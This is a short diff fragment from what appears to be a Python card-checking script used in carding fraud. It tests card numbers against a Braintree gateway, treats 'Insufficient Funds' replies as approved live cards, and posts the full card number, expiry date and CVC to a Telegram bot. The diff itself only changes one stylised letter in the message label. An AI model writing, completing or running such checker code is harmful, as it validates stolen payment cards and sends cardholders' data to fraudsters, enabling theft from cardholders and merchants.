@@ -531,7 +531,7 @@ if 'Do Not Honor' in response:
     elif "Insufficient Funds" in response:
         print(f'{P} >> 𝗔ρρяσνє𝗗 ✅ < Google Play ✅ > ')
         requests.post(f"""https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text=
-    	Cαя∂ -> {n}|{mm}|{yy}|{cvc}
+    	Cαяd -> {n}|{mm}|{yy}|{cvc}
     	  Bιи -> {P[:6]} 
     	  Gαтєωαу -> Braintree Auth
         Rєѕυℓт -> 𝗔ρρяσνє𝗗 ✅
